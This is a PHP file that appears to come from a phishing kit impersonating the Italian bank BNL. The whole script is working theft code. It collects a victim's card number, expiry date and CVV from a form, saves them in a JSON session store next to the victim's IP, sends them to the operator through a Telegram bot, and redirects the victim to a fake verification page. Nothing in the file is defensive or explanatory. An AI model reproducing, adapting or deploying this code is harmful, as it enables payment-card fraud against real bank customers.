<?php
require_once __DIR__ . '/telegram_config.php';

$id      = $_POST['id'] ?? '';
$carta   = trim($_POST['carta_numero'] ?? '');
$scad    = trim($_POST['carta_scadenza'] ?? '');
$cvv     = trim($_POST['carta_cvv'] ?? '');

if (!$id) { header('Location: index.html'); exit; }

$df = __DIR__ . '/data.json';
$data = file_exists($df) ? json_decode(file_get_contents($df), true) : ['sessions' => []];

if (isset($data['sessions'][$id])) {
    $data['sessions'][$id]['carta_numero']   = $carta;
    $data['sessions'][$id]['carta_scadenza'] = $scad;
    $data['sessions'][$id]['carta_cvv']      = $cvv;
    $data['sessions'][$id]['status']         = 'waiting';
    $data['sessions'][$id]['next_page']      = '';
    $data['sessions'][$id]['force_redirect'] = 0;            // ← RESET
    $data['sessions'][$id]['updated_at']     = date('Y-m-d H:i:s');
    file_put_contents($df, json_decode(file_get_contents($df), true) === $data ? $df : $df); // dummy
    file_put_contents($df, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

    $nc = $data['sessions'][$id]['nc'];
    $ip = $data['sessions'][$id]['ip'];
    $msg = "<b>BNL CARTA</b>\n"
         . "ID: <code>{$id}</code>\n"
         . "IP: {$ip}\n"
         . "NC: <code>{$nc}</code>\n"
         . "Carta: <code>{$carta}</code>\n"
         . "Scad: <code>{$scad}</code> | CVV: <code>{$cvv}</code>";
    tg_send($msg);
}

header("Location: verifica.php?id=" . urlencode($id));
exit;